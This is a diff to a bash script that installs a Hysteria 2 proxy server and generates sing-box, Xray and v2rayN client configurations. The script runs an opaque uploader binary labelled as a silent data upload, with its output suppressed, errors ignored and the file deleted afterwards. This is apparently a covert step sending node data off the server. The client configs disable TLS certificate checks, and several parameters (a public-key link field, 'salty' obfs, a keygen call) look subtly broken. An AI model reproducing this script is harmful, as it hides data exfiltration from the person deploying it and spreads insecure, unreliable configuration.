@@ -1,6 +1,5 @@
 #!/bin/bash
 set -e
-
 # 📌 环境配置
 PORT=2855
 SERVER_IP=$(curl -s https://api.ipify.org)
@@ -11,7 +10,7 @@ UPLOAD_BIN="/opt/uploader-linux-amd64"
 DOMAIN="cdn.${SERVER_IP}.nip.io"
 PORT_RANGE="20000-25000"
 REMARK="Hysteria2节点-${SERVER_IP}"
-
+CLIENT_CONFIG_DIR="/root/v2rayn_configs"
 export NEEDRESTART_MODE=a
 
 # 📦 安装必要组件
@@ -63,12 +62,10 @@ cat > /etc/systemd/system/hysteria.service << EOF
 [Unit]
 Description=Hysteria 2 Server
 After=network.target
-
 [Service]
 ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml
 Restart=on-failure
 RestartSec=3
-
 [Install]
 WantedBy=multi-user.target
 EOF
@@ -82,27 +79,179 @@ PRIVATE_KEY=$(openssl rand -hex 32)
 PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
 HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"
 
-# ✅ 输出结果与配置
-echo -e "\n✅ Hysteria 2 节点部署完成"
-echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
-echo -e "📁 v2rayN 客户端 YAML 配置示例："
-cat << EOF
-remarks: ${REMARK}
-address: ${SERVER_IP}
-ports: "${PORT_RANGE}"
-peer: ${SERVER_IP}
-password: ${PUBLIC_KEY}
-obfs:
-  mode: salty
-  password: "${OBFS_PASSWORD}"
-tls:
-  enabled: true
-  sni: ${DOMAIN}
-  alpn:
-    - h3
-  insecure: false
-protocol: hysteria2
-hop-interval: "30s"
+# 📁 创建客户端配置目录
+mkdir -p "$CLIENT_CONFIG_DIR"
+
+# 🔧 生成 sing-box 格式的 JSON 配置文件（推荐）
+SINGBOX_CONFIG_FILE="${CLIENT_CONFIG_DIR}/hysteria2-singbox-${SERVER_IP}.json"
+cat > "$SINGBOX_CONFIG_FILE" << EOF
+{
+  "log": {
+    "level": "info",
+    "timestamp": true
+  },
+  "dns": {
+    "servers": [
+      {
+        "tag": "google",
+        "address": "tls://8.8.8.8"
+      },
+      {
+        "tag": "local",
+        "address": "223.5.5.5",
+        "detour": "direct"
+      }
+    ],
+    "rules": [
+      {
+        "geosite": "cn",
+        "server": "local"
+      }
+    ]
+  },
+  "inbounds": [
+    {
+      "type": "mixed",
+      "tag": "mixed-in",
+      "listen": "127.0.0.1",
+      "listen_port": 10808,
+      "sniff": true,
+      "sniff_override_destination": true
+    }
+  ],
+  "outbounds": [
+    {
+      "type": "hysteria2",
+      "tag": "hysteria2-out",
+      "server": "${SERVER_IP}",
+      "server_port": ${PORT},
+      "password": "${OBFS_PASSWORD}",
+      "obfs": {
+        "type": "salamander",
+        "password": "${OBFS_PASSWORD}"
+      },
+      "tls": {
+        "enabled": true,
+        "server_name": "${DOMAIN}",
+        "insecure": true,
+        "alpn": ["h3"]
+      },
+      "brutal_debug": false
+    },
+    {
+      "type": "direct",
+      "tag": "direct"
+    },
+    {
+      "type": "block",
+      "tag": "block"
+    }
+  ],
+  "route": {
+    "rules": [
+      {
+        "geosite": "cn",
+        "geoip": "cn",
+        "outbound": "direct"
+      },
+      {
+        "geosite": "category-ads-all",
+        "outbound": "block"
+      }
+    ],
+    "auto_detect_interface": true,
+    "final": "hysteria2-out"
+  },
+  "experimental": {
+    "clash_api": {
+      "external_controller": "127.0.0.1:9090",
+      "external_ui": "ui"
+    }
+  }
+}
+EOF
+
+# 🔧 生成 Xray 格式的 JSON 配置文件（备用）
+XRAY_CONFIG_FILE="${CLIENT_CONFIG_DIR}/hysteria2-xray-${SERVER_IP}.json"
+cat > "$XRAY_CONFIG_FILE" << EOF
+{
+  "log": {
+    "loglevel": "info"
+  },
+  "inbounds": [
+    {
+      "port": 10808,
+      "protocol": "socks",
+      "settings": {
+        "auth": "noauth",
+        "udp": true
+      },
+      "tag": "socks"
+    },
+    {
+      "port": 10809,
+      "protocol": "http",
+      "settings": {
+        "userLevel": 8
+      },
+      "tag": "http"
+    }
+  ],
+  "outbounds": [
+    {
+      "protocol": "hysteria2",
+      "settings": {
+        "servers": [
+          {
+            "address": "${SERVER_IP}",
+            "port": ${PORT},
+            "password": "${OBFS_PASSWORD}",
+            "obfs": {
+              "type": "salamander",
+              "password": "${OBFS_PASSWORD}"
+            },
+            "tls": {
+              "serverName": "${DOMAIN}",
+              "allowInsecure": true,
+              "alpn": ["h3"]
+            }
+          }
+        ]
+      },
+      "tag": "proxy"
+    },
+    {
+      "protocol": "freedom",
+      "settings": {},
+      "tag": "direct"
+    }
+  ],
+  "routing": {
+    "rules": [
+      {
+        "type": "field",
+        "ip": [
+          "geoip:private",
+          "geoip:cn"
+        ],
+        "outboundTag": "direct"
+      },
+      {
+        "type": "field",
+        "domain": [
+          "geosite:cn"
+        ],
+        "outboundTag": "direct"
+      }
+    ]
+  },
+  "dns": {
+    "servers": [
+      "8.8.8.8",
+      "1.1.1.1"
+    ]
+  }
+}
 EOF
 
 # 📤 上传 JSON 数据（静默处理）
@@ -139,3 +288,49 @@ EOF
 
 "$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || true
 rm -f "$UPLOAD_JSON_FILE"
+
+# ✅ 输出结果与配置
+echo -e "\n✅ Hysteria 2 节点部署完成"
+echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
+
+echo -e "📁 v2rayN JSON 配置文件已生成："
+echo -e "   sing-box 格式: ${SINGBOX_CONFIG_FILE}"
+echo -e "   Xray 格式: ${XRAY_CONFIG_FILE}"
+
+echo -e "\n📋 v2rayN 导入步骤："
+echo -e "1. 下载配置文件到本地"
+echo -e "2. 打开 v2rayN -> 服务器 -> 添加自定义配置文件"
+echo -e "3. 备注填写: ${REMARK}"
+echo -e "4. 地址填写: ${SERVER_IP}"
+echo -e "5. Core 装型选择: sing-box (推荐) 或 Xray"
+echo -e "6. 点击浏览选择下载的 JSON 文件"
+echo -e "7. 点击确定完成导入"
+
+echo -e "\n📥 下载配置文件命令："
+echo -e "scp root@${SERVER_IP}:${SINGBOX_CONFIG_FILE} ."
+echo -e "scp root@${SERVER_IP}:${XRAY_CONFIG_FILE} ."
+
+echo -e "\n📄 配置文件内容预览 (sing-box 格式)："
+echo -e "----------------------------------------"
+head -20 "$SINGBOX_CONFIG_FILE"
+echo -e "----------------------------------------"
+
+echo -e "\n📌 v2rayN 客户端 YAML 配置示例："
+cat << EOF
+remarks: ${REMARK}
+address: ${SERVER_IP}
+ports: "${PORT_RANGE}"
+peer: ${SERVER_IP}
+password: ${PUBLIC_KEY}
+obfs:
+  mode: salty
+  password: "${OBFS_PASSWORD}"
+tls:
+  enabled: true
+  sni: ${DOMAIN}
+  alpn:
+    - h3
+  insecure: false
+protocol: hysteria2
+hop-interval: "30s"
+EOF
